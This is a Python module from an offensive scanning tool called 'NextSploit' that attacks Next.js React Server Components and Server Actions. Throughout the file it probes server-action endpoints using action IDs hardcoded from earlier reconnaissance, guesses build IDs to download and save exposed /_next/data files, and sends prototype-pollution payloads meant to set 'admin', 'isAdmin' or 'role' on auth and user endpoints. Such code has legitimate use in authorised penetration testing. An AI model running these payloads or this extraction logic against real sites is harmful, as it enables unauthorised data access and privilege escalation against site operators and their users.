#!/usr/bin/env python3
"""
NextSploit — RSC Protocol & Server Actions Attack v2
Merged from: step8_rsc_attack.py + RSC.py

Improvements:
  - Build ID extracted from CDN URL pattern (productionassets CDN)
  - Uses discovered_build_id / discovered_action_ids from fingerprint
  - Prototype pollution uses response diff (not all-200 flagging)
  - Known Action IDs from prior recon integrated
"""

import os
import re
import json
import hashlib
import uuid
import requests

from core.config import ScanConfig
from core.reporter import ModuleResult, Finding
from core.output import (
    log_info, log_success, log_warning, log_critical, log_debug,
    log_trace, log_error, log_status, print_module_header, print_finding,
    create_progress,
)
from core.fp_engine import validate_prototype_pollution

MODULE_NAME = "RSC-Attack"
MODULE_TITLE = "RSC Protocol & Server Actions"
MODULE_SEVERITY = "HIGH"

BOUNDARY = "----WebKitFormBoundary7MA4YWxkTrZu0gW"

# CDN Build ID patterns
BUILD_ID_CDN_RE = re.compile(r'https?://[^/]+/next-app/([a-zA-Z0-9_-]{16,})/')
BUILD_ID_STATIC_RE = re.compile(r'/_next/static/([a-zA-Z0-9_-]{8,})/')


def _hash(text: str) -> str:
    return hashlib.md5(text.encode(errors='ignore')).hexdigest()

# ─── Targets ─────────────────────────────────────────────────────────────────

# RSC indicator paths
RSC_PATHS = [
    ("/_next/static/chunks/app/layout.js", "App Router layout"),
    ("/_next/static/chunks/app/page.js", "App Router page"),
    ("/_next/static/chunks/pages/_app.js", "Pages Router _app"),
    ("/_next/static/chunks/main.js", "Main bundle"),
    ("/_next/static/chunks/webpack.js", "Webpack runtime"),
    ("/_next/image", "Image Optimization API"),
    ("/favicon.ico", "Favicon"),
    ("/robots.txt", "Robots.txt"),
    ("/sitemap.xml", "Sitemap"),
]

# Server Action endpoints to probe
ACTION_ENDPOINTS = [
    "/", "/api", "/api/auth", "/api/auth/callback",
    "/api/auth/session", "/api/auth/signin",
    "/api/user", "/api/data",
]

# Prototype pollution payloads
PP_PAYLOADS = [
    ('{"__proto__":{"admin":true}}', "__proto__.admin"),
    ('{"constructor":{"prototype":{"admin":true}}}', "constructor.prototype.admin"),
    ('["__proto__","admin",true]', "__proto__ array"),
    ('{"__proto__":{"isAdmin":"true"}}', "__proto__.isAdmin"),
    ('{"__proto__":{"role":"admin"}}', "__proto__.role"),
    ('{"__proto__":{"constructor":{"prototype":{"toString":true}}}}', "nested proto pollution"),
]


def scan(config: ScanConfig) -> ModuleResult:
    """
    Scan RSC Protocol & Server Actions.
    
    Phase 1: RSC endpoint discovery
    Phase 2: Server Actions probe (Next-Action header)
    Phase 3: Multipart Server Action testing
    Phase 4: RSC data extraction via Build ID
    Phase 5: Prototype pollution via Next-Action
    """
    result = ModuleResult(
        cve=MODULE_NAME,
        title=MODULE_TITLE,
        severity=MODULE_SEVERITY,
        status="NOT VULNERABLE",
    )

    print_module_header(MODULE_NAME, MODULE_TITLE, MODULE_SEVERITY)
    session = config.create_session()
    target = config.target.rstrip("/")

    os.makedirs("reports", exist_ok=True)

    # ════════════════════════════════════════════════════════════════════
    # Phase 1: RSC Endpoint Discovery
    # ════════════════════════════════════════════════════════════════════
    log_info("[Phase 1] RSC endpoint discovery...")

    with create_progress() as progress:
        task = progress.add_task("RSC Endpoint Scan", total=len(RSC_PATHS))

        for path, desc in RSC_PATHS:
            progress.update(task, advance=1)

            try:
                r = session.get(f"{target}{path}", timeout=config.timeout)
                log_status(r.status_code, path, desc)

                if r.status_code == 200 and len(r.text) > 50:
                    log_debug(f"Found: {desc} ({len(r.text)} bytes)")

                    # Save interesting files
                    if path.endswith(('.js', '.json', '.txt', '.xml')):
                        fname = path.split('/')[-1]
                        save_path = f"reports/rsc_{fname}"
                        try:
                            with open(save_path, "w", errors="ignore") as f:
                                f.write(r.text)
                            log_debug(f"Saved to {save_path}")
                        except Exception:
                            pass

            except requests.RequestException as e:
                log_trace(f"Error {path}: {e}")

    # ════════════════════════════════════════════════════════════════════
    # Phase 2: Server Actions Probe (Next-Action header)
    # ════════════════════════════════════════════════════════════════════
    log_info("[Phase 2] Server Actions probe via Next-Action header...")

    # Use discovered action IDs from fingerprint phase if available
    discovered_ids = list(config.discovered_action_ids) if config.discovered_action_ids else []
    # Also include known IDs from prior recon
    prior_recon_ids = [
        "612d91dd", "fec7a9a5", "020f4173", "95bb2e51",
        "a437ef45", "7fad778c", "ff1e44e2", "ddecccba",
    ]
    all_action_ids = list(set(discovered_ids + prior_recon_ids))
    log_info(f"Using {len(all_action_ids)} Action IDs ({len(discovered_ids)} discovered, {len(prior_recon_ids)} from recon)")

    with create_progress() as progress:
        total_sa = len(ACTION_ENDPOINTS) * min(len(all_action_ids), 3)
        task = progress.add_task("Server Actions Probe", total=total_sa)

        for ep in ACTION_ENDPOINTS:
            url = f"{target}{ep}"

            # Baseline GET to compare against
            try:
                r_base = session.get(url, timeout=config.timeout, allow_redirects=False)
                base_hash = _hash(r_base.text)
                base_size = len(r_base.text)
            except Exception:
                base_hash, base_size = "", 0

            # Test each action ID (prioritize discovered + known)
            ids_to_test = all_action_ids[:3] + [str(uuid.uuid4())[:8]]  # + random
            for action_id in ids_to_test:
                progress.update(task, advance=1)
                try:
                    r = session.post(
                        url,
                        headers={
                            "Next-Action": action_id,
                            "Content-Type": "text/plain;charset=UTF-8",
                        },
                        data='["test"]',
                        timeout=config.timeout,
                    )
                    log_status(r.status_code, f"POST {ep}", f"Next-Action: {action_id}")

                    resp_hash = _hash(r.text)
                    size_diff = abs(len(r.text) - base_size)

                    # Only flag if response differs significantly from baseline GET
                    if r.status_code == 200 and resp_hash != base_hash and size_diff > 500:
                        detail = (
                            f"Server Action responds differently on {ep} "
                            f"with action_id={action_id} "
                            f"(diff from baseline: {size_diff} bytes)"
                        )
                        log_warning(detail)
                        evidence = {
                            "endpoint": ep,
                            "action_id": action_id,
                            "status_code": 200,
                            "response_size": f"{len(r.text)} bytes",
                            "baseline_size": f"{base_size} bytes",
                            "size_diff": f"{size_diff} bytes",
                            "preview": r.text[:500],
                        }
                        print_finding(MODULE_NAME, detail, evidence)
                        result.add_finding(Finding(
                            cve=MODULE_NAME, severity="MEDIUM",
                            title="Server Action Endpoint Active",
                            status="VULNERABLE", detail=detail, evidence=evidence,
                        ))
                        break  # Found active SA on this endpoint, move on

                    elif r.status_code not in (404, 405) and r.text:
                        log_debug(f"Interesting [{r.status_code}] {ep}: {r.text[:100]}")

                except requests.RequestException as e:
                    log_trace(f"Error POST {ep}: {e}")

    # ════════════════════════════════════════════════════════════════════
    # Phase 3: Multipart Server Action Testing
    # ════════════════════════════════════════════════════════════════════
    log_info("[Phase 3] Multipart Server Action testing...")

    with create_progress() as progress:
        task = progress.add_task("Multipart Action Test", total=len(ACTION_ENDPOINTS))

        for ep in ACTION_ENDPOINTS:
            progress.update(task, advance=1)
            url = f"{target}{ep}"

            body = (
                f'--{BOUNDARY}\r\n'
                f'Content-Disposition: form-data; name="1_$ACTION_ID_0"\r\n\r\n'
                f'["test"]\r\n'
                f'--{BOUNDARY}--\r\n'
            )

            try:
                r = session.post(
                    url,
                    headers={
                        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
                        "Accept": "text/x-component",
                    },
                    data=body,
                    timeout=config.timeout,
                )

                log_trace(f"[{r.status_code}] POST {ep} (multipart)")

                if r.status_code == 200 and r.text:
                    detail = (
                        f"Multipart Server Action responds on {ep} "
                        f"({len(r.text)} bytes)"
                    )
                    log_warning(detail)

                    evidence = {
                        "endpoint": ep,
                        "method": "multipart/form-data",
                        "status_code": 200,
                        "response_size": f"{len(r.text)} bytes",
                        "preview": r.text[:500],
                    }
                    print_finding(MODULE_NAME, detail, evidence)

                    result.add_finding(Finding(
                        cve=MODULE_NAME, severity="MEDIUM",
                        title="Multipart Server Action Active",
                        status="VULNERABLE", detail=detail,
                        evidence=evidence,
                    ))

            except requests.RequestException:
                pass

    # ════════════════════════════════════════════════════════════════════
    # Phase 4: RSC Data Extraction via Build ID
    # ════════════════════════════════════════════════════════════════════
    log_info("[Phase 4] RSC data extraction via Build ID...")

    try:
        r_main = session.get(target, timeout=config.timeout)
        page_text = r_main.text

        # Multi-strategy Build ID extraction
        build_id = config.discovered_build_id  # From fingerprint phase
        if not build_id:
            # Strategy 1: CDN URL
            cdn_ids = BUILD_ID_CDN_RE.findall(page_text)
            if cdn_ids:
                build_id = max(set(cdn_ids), key=cdn_ids.count)
                log_success(f"Build ID from CDN URL: [bold]{build_id}[/bold]")
        if not build_id:
            # Strategy 2: /_next/static/
            static_ids = BUILD_ID_STATIC_RE.findall(page_text)
            if static_ids:
                build_id = max(set(static_ids), key=static_ids.count)
                log_success(f"Build ID from static path: [bold]{build_id}[/bold]")

        if build_id:
            log_success(f"Build ID: [bold]{build_id}[/bold]")

            rsc_data_paths = [
                f"/_next/data/{build_id}/index.json",
                f"/_next/data/{build_id}/en.json",
                f"/_next/data/{build_id}/es.json",
                f"/_next/data/{build_id}/pt.json",
            ]

            # Also try generic patterns
            rsc_data_paths += [
                "/_next/data/latest/rsc",
                "/_next/data/development/rsc",
                "/_next/data/production/rsc",
            ]

            for rsc_path in rsc_data_paths:
                try:
                    r_rsc = session.get(f"{target}{rsc_path}", timeout=config.timeout)
                    log_status(r_rsc.status_code, rsc_path)

                    if r_rsc.status_code == 200 and r_rsc.text:
                        # Prevent False Positives: Soft 404s returning homepage HTML
                        if r_rsc.text.strip().lower().startswith("<!doctype html>") or r_rsc.text.strip().startswith("<html"):
                            log_trace(f"Soft 404 ignored on {rsc_path} (returned HTML)")
                            continue

                        detail = f"RSC data accessible: {rsc_path} ({len(r_rsc.text)} bytes)"
                        log_critical(detail)

                        evidence = {
                            "path": rsc_path,
                            "build_id": build_id,
                            "size": f"{len(r_rsc.text)} bytes",
                            "preview": r_rsc.text[:500],
                        }

                        # Save
                        safe_name = rsc_path.replace("/", "_").lstrip("_")
                        save_path = f"reports/rsc_data_{safe_name}"
                        try:
                            with open(save_path, "w", errors="ignore") as f:
                                f.write(r_rsc.text)
                            evidence["saved_to"] = save_path
                        except Exception:
                            pass

                        print_finding(MODULE_NAME, detail, evidence)
                        result.add_finding(Finding(
                            cve=MODULE_NAME, severity="HIGH",
                            title="RSC Data Extraction",
                            status="VULNERABLE", detail=detail,
                            evidence=evidence,
                        ))

                except requests.RequestException:
                    pass
        else:
            log_warning("Could not extract Build ID — skipping RSC data extraction")

    except requests.RequestException as e:
        log_error(f"Failed to fetch main page: {e}")

    # ════════════════════════════════════════════════════════════════════
    # Phase 5: Prototype Pollution via Next-Action (with diff analysis)
    # ════════════════════════════════════════════════════════════════════
    log_info("[Phase 5] Prototype pollution via Next-Action (baseline diff)...")

    pp_target_endpoints = ["/api/auth", "/api/user", "/api/data", "/"]

    # Collect baseline for each PP endpoint
    pp_baselines = {}
    for ep in pp_target_endpoints:
        try:
            r_b = session.post(
                f"{target}{ep}",
                headers={"Next-Action": "action_id_baseline", "Content-Type": "text/plain;charset=UTF-8"},
                data='["baseline"]',
                timeout=config.timeout,
            )
            pp_baselines[ep] = {"hash": _hash(r_b.text), "size": len(r_b.text)}
            log_debug(f"PP Baseline [{r_b.status_code}] {ep} — {len(r_b.text)} bytes")
        except Exception:
            pp_baselines[ep] = {"hash": "", "size": 0}

    with create_progress() as progress:
        total = len(pp_target_endpoints) * len(PP_PAYLOADS)
        task = progress.add_task("Proto Pollution Test", total=total)

        for ep in pp_target_endpoints:
            baseline_pp = pp_baselines.get(ep, {})

            for payload, desc in PP_PAYLOADS:
                progress.update(task, advance=1)

                try:
                    r = session.post(
                        f"{target}{ep}",
                        headers={
                            "Next-Action": all_action_ids[0] if all_action_ids else "action_id_0",
                            "Content-Type": "text/plain;charset=UTF-8",
                        },
                        data=payload,
                        timeout=config.timeout,
                    )
                    log_trace(f"[{r.status_code}] {ep} | PP: {desc}")

                    resp_hash = _hash(r.text)
                    size_diff = abs(len(r.text) - baseline_pp.get("size", 0))

                    is_valid, confidence, fp_reason = validate_prototype_pollution(
                        baseline_size=baseline_pp.get("size", 0),
                        response_size=len(r.text),
                        baseline_hash=baseline_pp.get("hash", ""),
                        response_hash=resp_hash,
                        response_text=r.text,
                        payload=payload
                    )

                    if r.status_code == 200 and r.text not in ("{}", "", "null") and is_valid:
                        detail = (
                            f"Prototype pollution causes response diff on {ep} "
                            f"with '{desc}' (diff: {size_diff} bytes, confidence: {confidence:.2f})"
                        )
                        log_warning(detail)
                        evidence = {
                            "endpoint": ep,
                            "payload_type": desc,
                            "payload": payload,
                            "status_code": 200,
                            "baseline_size": f"{baseline_pp.get('size', 0)} bytes",
                            "response_size": f"{len(r.text)} bytes",
                            "size_diff": f"{size_diff} bytes",
                            "confidence_score": f"{confidence:.2f}",
                            "preview": r.text[:300],
                        }
                        print_finding(MODULE_NAME, detail, evidence)
                        result.add_finding(Finding(
                            cve=MODULE_NAME, severity="HIGH",
                            title="Prototype Pollution Response Difference",
                            status="VULNERABLE", detail=detail, evidence=evidence,
                        ))
                    else:
                        log_trace(f"PP ignored [{ep}|{desc}]: {fp_reason}")

                except requests.RequestException:
                    pass

    # ── Final status ─────────────────────────────────────────────────────
    if result.finding_count > 0:
        log_warning(f"Found {result.finding_count} RSC/Server Action issues")
    else:
        log_success("No RSC/Server Action vulnerabilities detected")

    return result
